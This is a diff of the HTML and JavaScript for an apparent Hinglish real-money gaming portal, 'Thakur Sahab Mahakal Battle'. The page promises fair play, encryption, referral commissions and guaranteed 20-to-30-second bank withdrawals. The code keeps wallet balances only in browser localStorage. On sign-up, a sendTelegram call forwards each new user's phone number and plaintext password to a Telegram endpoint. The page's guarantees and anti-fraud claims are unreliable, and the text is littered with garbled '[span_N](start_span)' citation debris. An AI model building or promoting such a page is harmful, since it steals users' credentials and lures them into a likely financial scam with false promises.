@@ -10,7 +10,7 @@
 <meta property="og:title" content="Thakur Sahab Mahakal Battle - Master Games Portal">
 <meta property="og:description" content="Paheliyan suljhayein, Ludo khelein aur Thakur Sahab ke sath asali nakad jeetein!">
 <meta property="og:image" content="1792858963757.png">
-<meta property="og:url" content="https://sandeepmahakal.github.io/mahakal-battle/">
+<meta property="og:url" content="https://thakursahabcreator.github.io/mahakal-battle/">
 <meta property="og:type" content="website">
 
 <!-- FontAwesome Icons for Social Buttons -->
@@ -224,27 +224,27 @@ transition: 0.3s;
         
         <p style="margin-top: 0;">
             <strong style="color: #00ffcc;">1. Thakur Sahab Platform Dwara Game ka Nirman:</strong><br>
-            Yeh game advanced provably fair algorithm aur secure international gaming standards ke tahat <strong>Thakur Sahab Official Gaming Partner Network</strong> dwara taiyar kiya gaya hai. Isme 256-bit SSL encryption ka pura palan kiya gaya hai taaki aapka har ek data 100% surakshit rahe[span_2](start_span)[span_2](end_span)[span_3](start_span)[span_3](end_span).
+            Yeh game advanced provably fair algorithm aur secure international gaming standards ke tahat <strong>Thakur Sahab Official Gaming Partner Network</strong> dwara taiyar kiya gaya hai[span_4](start_span)[span_4](end_span)[span_5](start_span)[span_5](end_span). Isme 256-bit SSL encryption ka pura palan kiya gaya hai taaki aapka har ek data 100% surakshit rahe[span_6](start_span)[span_6](end_span)[span_7](start_span)[span_7](end_span).
         </p>
 
         <p>
             <strong style="color: #00ffcc;">2. Game Kaise Khele aur Rules Kya Hain:</strong><br>
-            Is platform par aap Mahakal Puzzle Battle, Ludo Paasa Battle, aur Aviator Plane Game ka anand le sakte hain. Har game me transparent RNG system kaam karta hai, jisse sabhi khiladiyon ko jeetne ke barabar aur fair mauke milte hain[span_4](start_span)[span_4](end_span)[span_5](start_span)[span_5](end_span).
+            Is platform par aap Mahakal Puzzle Battle, Ludo Paasa Battle, aur Aviator Plane Game ka anand le sakte hain[span_8](start_span)[span_8](end_span)[span_9](start_span)[span_9](end_span). Har game me transparent RNG system kaam karta hai, jisse sabhi khiladiyon ko jeetne ke barabar aur fair mauke milte hain[span_10](start_span)[span_10](end_span)[span_11](start_span)[span_11](end_span).
         </p>
 
         <p>
             <strong style="color: #00ffcc;">3. Refer & Earn Aur Commission System:</strong><br>
-            Jab aap apne doston ya network par is official gaming platform ko share karte hain, toh har ek successful deposit aur gameplay par aapko seedha <strong>3% instant commission</strong> milta hai jo turant aapke wallet mein add ho jata hai[span_6](start_span)[span_6](end_span)[span_7](start_span)[span_7](end_span).
+            Jab aap apne doston ya network par is official gaming platform ko share karte hain, toh har ek successful deposit aur gameplay par aapko seedha <strong>3% instant commission</strong> milta hai jo turant aapke wallet mein add ho jata hai[span_12](start_span)[span_12](end_span)[span_13](start_span)[span_13](end_span).
         </p>
 
         <p>
             <strong style="color: #ff9900; font-weight: 700;">4. Withdrawal (Pase Nikalne) ki 100% Guarantee aur Time Limit:</strong><br>
-            Automated payment gateway ke zariye, jaise hi aap "Bank mein paise bhejen (Withdrawal)" par click karenge, theek <strong>20 se 30 sekund (seconds)</strong> ke andar aapke bank account ya UPI mein paise safal-purvak pahunch jayenge. Iski poori <strong>financial guarantee</strong> hai[span_8](start_span)[span_8](end_span)[span_9](start_span)[span_9](end_span)!
+            Automated payment gateway ke zariye, jaise hi aap "Bank mein paise bhejen (Withdrawal)" par click karenge, theek <strong>20 se 30 sekund (seconds)</strong> ke andar aapke bank account ya UPI mein paise safal-purvak pahunch jayenge[span_14](start_span)[span_14](end_span)[span_15](start_span)[span_15](end_span). Iski poori <strong>financial guarantee</strong> hai[span_16](start_span)[span_16](end_span)[span_17](start_span)[span_17](end_span)!
         </p>
 
         <p style="margin-bottom: 0;">
             <strong style="color: #ff4d4d; font-weight: 700;">5. Fraud-Giri aur Security ki Full Guarantee:</strong><br>
-            Yeh platform <strong>Zero Tolerance Fraud Policy</strong> par kaam karta hai. Yahan kisi bhi prakar ke dhokhadhadi ya scam ki koi gunjaish nahi hai. 24/7 AI Customer Support desk har samay aapki sahayata ke liye taiyar hai[span_10](start_span)[span_10](end_span)[span_11](start_span)[span_11](end_span).
+            Yeh platform <strong>Zero Tolerance Fraud Policy</strong> par kaam karta hai[span_18](start_span)[span_18](end_span)[span_19](start_span)[span_19](end_span). Yahan kisi bhi prakar ke dhokhadhadi ya scam ki koi gunjaish nahi hai[span_20](start_span)[span_20](end_span)[span_21](start_span)[span_21](end_span). 24/7 AI Customer Support desk har samay aapki sahayata ke liye taiyar hai[span_22](start_span)[span_22](end_span)[span_23](start_span)[span_23](end_span).
         </p>
         
     </div>
@@ -437,17 +437,16 @@ function sendTelegram(text) {
   fetch(url).catch(e => console.log(e));
 }
 
-// Multi-User Wallet Management Functions
+// Multi-User Independent Wallet Management
 function getUserBalance() {
   if (!loggedInPhone) return 19;
   let allBalances = JSON.parse(localStorage.getItem('mahakal_user_wallets') || "{}");
-  if (allBalances[loggedInPhone] !== undefined) {
-    return allBalances[loggedInPhone];
-  } else {
-    allBalances[loggedInPhone] = 19; // Default bonus for new user
+  
+  if (allBalances[loggedInPhone] === undefined) {
+    allBalances[loggedInPhone] = 19; // Naye number ke liye shuruati balance ₹19
     localStorage.setItem('mahakal_user_wallets', JSON.stringify(allBalances));
-    return 19;
   }
+  return allBalances[loggedInPhone];
 }
 
 function saveUserBalance(newBal) {
@@ -459,7 +458,6 @@ function saveUserBalance(newBal) {
 }
 
 window.onload = function() {
-  // Check if user was already logged in before refresh
   let savedPhone = localStorage.getItem('mahakal_active_user');
   if(savedPhone) {
     loggedInPhone = savedPhone;
@@ -648,7 +646,7 @@ function processLogin() {
   }
 
   loggedInPhone = ph; 
-  localStorage.setItem('mahakal_active_user', ph); // Save active session
+  localStorage.setItem('mahakal_active_user', ph); 
   updateReferralLink();
 
   let registeredUsers = JSON.parse(localStorage.getItem('mahakal_users_db') || "{}");
@@ -664,9 +662,6 @@ function processLogin() {
     registeredUsers[ph] = ps;
     localStorage.setItem('mahakal_users_db', JSON.stringify(registeredUsers));
     
-    // Initialize user balance with ₹19 bonus
-    let currentBal = getUserBalance();
-    
     let sound = document.getElementById('bonus-sound');
     if(sound) sound.play().catch(e => console.log(e));
 
@@ -675,7 +670,6 @@ function processLogin() {
     sendTelegram(`🚀 Naya User Registered & Instant Bonus Given!\n📱 Number: ${ph}\n🔑 Pass: ${ps}\n💰 Bonus: ₹19 Credited${refText}`);
   }
 
-  // Set Balance on Dashboard
   document.getElementById('balance').innerText = getUserBalance();
 
   setTimeout(() => {
